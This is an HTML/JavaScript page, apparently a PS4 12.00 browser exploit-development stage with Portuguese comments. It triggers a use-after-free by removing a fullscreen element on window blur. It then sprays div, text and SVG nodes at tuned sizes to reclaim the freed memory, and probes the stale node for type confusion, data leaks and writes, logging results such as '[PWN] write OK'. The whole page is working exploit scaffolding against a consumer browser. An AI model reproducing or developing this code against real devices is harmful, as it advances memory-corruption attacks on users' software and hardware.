<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Precision Stage</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF Precision (1 Array Required)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 LOG SEGURO
// ==========================
let logBuffer = [];
function log(msg){
    try{console.log(msg);}catch(e){}
    logBuffer.push(msg);
}

// ==========================
// 💣 HEAP PRIMING (CRÍTICO)
// ==========================
function setupHeap(){
    let t = new Float64Array(8);
    t[0] = 0x1337;

    window.__priming_array = t;

    log("[*] heap primed (1 array)");
}

// ==========================
// FULLSCREEN (INALTERADO)
// ==========================
function setupFullscreen(){

    let fsTarget=document.createElement("div");

    fsTarget.innerHTML =
        "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 RECLAIM PRECISO
// ==========================
function preciseReclaim(size){

    log("[*] Reclaim size = "+size);

    let bucket = [];

    // churn leve
    for(let i=0;i<1500;i++){
        let el=document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    for(let i=0;i<size;i++){

        let el;

        switch(i % 3){

            case 0:
                el = document.createElement("div");
                el.innerHTML =
                    "<h1>CTRL_"+i+"_41414141</h1>";
                break;

            case 1:
                el = document.createTextNode(
                    "TXT_"+i+"_BBBBBBBBBBBBBBBBBBBBBBBB"
                );
                document.body.appendChild(el);
                bucket.push(el);
                continue;

            case 2:
                el = document.createElementNS(
                    "http://www.w3.org/2000/svg",
                    "svg"
                );
                el.innerHTML = "<circle cx='5' cy='5' r='5'></circle>";
                break;
        }

        document.body.appendChild(el);
        bucket.push(el);
    }

    return bucket;
}

// ==========================
// 🔬 PROBE AVANÇADO
// ==========================

       function deepProbe(fsTarget){

    log("---- PROBE ----");

    try{
        let node = fsTarget.firstChild;

        log("[CHECK] node = "+node);
        log("[CHECK] nodeType = "+node?.nodeType);

        let isHTML = node instanceof HTMLElement;
        let isSVG  = node instanceof SVGElement;

        log("[CHECK] HTMLElement = "+isHTML);
        log("[CHECK] SVGElement = "+isSVG);

        if(node?.nodeType === 3){
            log("[!!!] TEXTNODE DETECTADO");
        }

        if(isHTML && isSVG){
            log("[!!!] TYPE CONFUSION REAL");
        }

        try{
            let val = node.textContent || node.nodeValue;
            log("[LEAK?] data = "+val);
        }catch(e){
            log("[LEAK] crash");
        }

        try{
            node.innerHTML = "<b>CCCC</b>";
            log("[PWN] write OK");
        }catch(e){
            log("[UAF] write crash");
        }

        try{
            node.getBoundingClientRect();
            log("[CHECK] rect OK");
        }catch(e){
            log("[UAF] rect crash");
        }

    }catch(e){
        log("[CRASH] probe fail");
    }
} 

// ==========================
// TRIGGER
// ==========================
function trigger(fsTarget){

    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    }catch(e){}

    // 🔥 faixa refinada (IMPORTANTE)
    let sizes = [1800, 2000, 2200];

    sizes.forEach((size, idx)=>{
        setTimeout(()=>preciseReclaim(size), idx*60);
    });

    // 🔬 probes mais agressivos
    setTimeout(()=>deepProbe(fsTarget), 10);
    setTimeout(()=>deepProbe(fsTarget), 30);
    setTimeout(()=>deepProbe(fsTarget), 60);
    setTimeout(()=>deepProbe(fsTarget), 120);
    setTimeout(()=>deepProbe(fsTarget), 200);

    // 📜 log final
    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    },400);

    setTimeout(()=>location.reload(),600);
}

// ==========================
// MAIN
// ==========================
function runTest(){

    log("[*] Iniciando teste");

    setupHeap(); // 💣 ESSENCIAL (1 array)

    let fsTarget = setupFullscreen();

    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget),3000);
    };
}

</script>

</body>
</html>
